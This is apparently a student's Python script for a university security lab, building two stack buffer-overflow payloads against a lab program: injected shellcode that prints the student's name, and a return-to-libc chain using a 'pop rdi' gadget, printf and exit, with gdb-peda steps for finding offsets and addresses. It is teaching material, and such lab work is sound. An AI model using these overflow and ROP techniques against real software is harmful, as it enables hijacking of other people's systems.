#!/usr/bin/env python
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
# Modified by Zhang Hao Student ID 1000899

from struct import *

################ Shellcode with GDB ##################


lennops = 0  # or some other value
# I didn't use NOPs because I don't need it if I can find out the exact address of over shellcode


lenfill = 72  # or some other value
# Because the buffer size is 64, Old RBP size is 8, therefore in total 72 bits should be filled with "A" in payload


# I designed my own shellcode, which should print out "I'm Zhang Hao" when excuted.
shellcode = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x49\x27\x6d\x20\x5a\x68\x61\x6e\x67\x20\x48\x61\x6f\x2e'
string = "I'm Zhang Hao"

# Set up return address. Pack is best to turn int to binary
# for inside gdb

address = pack("<Q", 0x7fffffffde98)

# using gdb-peda$ pattern create 100 payload and pattern_search, we can find out the addresses of the overflowed
# memory address, I selected the first one, which is 0x7fffffffde98, to be the return address so that no NOP would
# be needed.
# The final payload will be 'A'*72 + packed address 0x7fffffffde98 + shellcode
# payload = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98\xde\xff\xff\xff\x7f\x00\x00\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x49\x27\x6d\x20\x5a\x68\x61\x6e\x67\x20\x48\x61\x6f\x2e


# for outside gdb
address = pack("<Q", 0x7fffffffde58)

# In terminal window 1, $ ./vulnapp
# This will start the code and creates a process

# In terminal window 2, $ sudo gdb -p $(pgrep vulanpp)
# This will attach gdb to the existing process ran in window1

# In gdb, first find out the address of ret by break in the main function using break *0x400652
# In gdb, type c to continue the process

# In terminal window 1, we type our payload("AAAAAA.... etc." ) and ctrl+D enter
# then we are able to find out the address of ret, 0x7fffffffde58

# repeat the steps again in terminal 1 with the new payload:
# The final payload will be 'A'*72 + packed address 0x7fffffffde58 + shellcode
# payload = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x58\xde\xff\xff\xff\x7f\x00\x00\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x49\x27\x6d\x20\x5a\x68\x61\x6e\x67\x20\x48\x61\x6f\x2e


nops = b"\x90" * lennops

with open('payload_1', 'wb') as f:
    f.write(b'A' * lenfill + address + nops + shellcode)


################ Return To Libc ##################




# The payload need to be like this:
# buffer with size 64
# old RBP address with size 8
# return address with size 8
# string address with size 8
# printf address with size 8
# exit address with size 8

lenfill = 72  # or some other value
# Because the buffer size is 64, Old RBP size is 8, therefore in total 72 bits should be filled with "A" in payload



########### for inside GDB

ret_address = pack("<Q", 0x7ffff7a63010)
# we change the address of ret to gadget address:
# gdb-peda $ ropserch "pop rdi" libc
# Searching for ROP gadget: 'pop rdi' in: libc ranges
# 0x00007ffff7ad0802 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7afe001 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7b4400a : (b'5fc3')	pop rdi; ret
# 0x00007ffff7aeb00c : (b'5fc3')	pop rdi; ret
# 0x00007ffff7aef2ad : (b'5fc3')	pop rdi; ret
# 0x00007ffff7a63010 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7b09011 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7a3601b : (b'5fc3')	pop rdi; ret
# 0x00007ffff7b2d81e : (b'5fc3')	pop rdi; ret
# 0x00007ffff7a81020 : (b'5fc3')	pop rdi; ret
# 0x00007ffff7aed026 : (b'5fc3')	pop rdi; ret
# We can select any of the above address


string_address = pack("<Q", 0x7fffffffead6)
# I used environment variable to do this
# First put the string "I'am Zhang Hao" using $ export MYTEXT=I'm Zhang Hao
# then in side gdb, using gbd-peda$ x /50s *(char **)environ, we can find out the address of the string


printf_address = pack("<Q", 0x7ffff7a637b0)
# to get the address of printf:
# gdb-peda$ p printf
#$1 = {<text variable, no debug info>} 0x7ffff7a637b0 <__printf>


exit_address = pack("<Q", 0x7ffff7a48020)
# to get the address of exit:
# gdb-peda$ p exit
# $2 = {<text variable, no debug info>} 0x7ffff7a48020 <__GI_exit>


with open('payload_2', 'wb') as f:
    f.write(b'A' * lenfill + ret_address + string_address + printf_address + exit_address)


########### for outside GDB

# similar to the previous part, we can attach gdb to an existing process
# Export an environment variable
# using $ export MYTEXT=I'm Zhang Hao



# In terminal window 1, $ ./vulnappROP
# This will start the code and creates a process

# In terminal window 2, $ sudo gdb -p $(pgrep vulanppROP)
# This will attach gdb to the existing process ran in window1

# Then we find out gadget address, printf address, exit address, string address
# In terminal window 1, we type our payload(b'A' * lenfill + ret_address + string_address + printf_address + exit_address) and ctrl+D enter
# This should print out the string we set in environment variable









